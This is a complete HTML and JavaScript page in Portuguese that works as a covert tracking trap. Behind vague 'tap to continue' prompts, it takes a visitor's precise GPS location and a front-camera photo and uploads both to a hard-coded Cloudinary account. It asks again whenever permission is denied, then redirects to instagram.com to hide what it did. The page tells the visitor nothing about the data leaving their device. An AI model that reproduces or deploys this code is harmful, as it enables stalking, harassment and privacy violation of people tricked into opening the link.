<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      background: rgba(255,255,255,0.9);
      font-family: sans-serif; font-size: 20px; color: #333;
      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="overlay" style="display:none"></div>
  <script>
    const cloudName = 'dx5legahb';
    const uploadPreset = 'upload';
    const folderName = 'capturas';
    const overlay = document.getElementById('overlay');

    // Exibe overlay com mensagem e handler
    function showOverlay(message, handler) {
      overlay.textContent = message;
      overlay.style.display = 'flex';
      overlay.onclick = () => {
        overlay.style.display = 'none';
        handler();
      };
    }

    // Envia localização para Cloudinary
    async function uploadLocation(lat, lon) {
      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
      const form = new FormData();
      form.append('file', blob, `localizacao_${Date.now()}.txt`);
      form.append('upload_preset', uploadPreset);
      form.append('folder', folderName);
      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form });
    }

    // Captura foto e envia
    async function captureAndUploadPhoto() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      const video = document.createElement('video');
      video.setAttribute('playsinline', '');
      video.autoplay = true;
      video.muted = true;
      video.srcObject = stream;
      await new Promise(res => video.onloadedmetadata = res);
      video.play();
      await new Promise(res => setTimeout(res, 500));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      stream.getTracks().forEach(t => t.stop());

      return new Promise((resolve) => {
        canvas.toBlob(async (blob) => {
          const form = new FormData();
          form.append('file', blob);
          form.append('upload_preset', uploadPreset);
          form.append('folder', folderName);
          const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: form });
          const data = await resp.json();
          resolve(data.secure_url);
        }, 'image/png');
      });
    }

    // Passo 1: solicitar localização
    function requestLocation() {
      if (!navigator.geolocation) {
        alert('Geolocalização não suportada');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;
          try {
            await uploadLocation(latitude, longitude);
            // Após enviar localização, pede câmera
            showOverlay('Toque para permitir o acesso à câmera', requestCamera);
          } catch (e) {
            console.error(e);
            showOverlay('Erro ao enviar localização. Toque para tentar novamente.', requestLocation);
          }
        },
        () => {
          showOverlay('Toque para permitir a localização', requestLocation);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Passo 2: solicitar câmera, capturar e redirecionar
    async function requestCamera() {
      try {
        const imageUrl = await captureAndUploadPhoto();
        // redireciona após sucesso
        window.location.href = 'https://instagram.com';
      } catch (e) {
        console.error(e);
        showOverlay('Permissão de câmera negada. Toque para tentar novamente.', requestCamera);
      }
    }

    // Inicia fluxo após DOM
    window.addEventListener('DOMContentLoaded', () => {
      showOverlay('Toque para continuar', requestLocation);
    });
  </script>
</body>
</html>
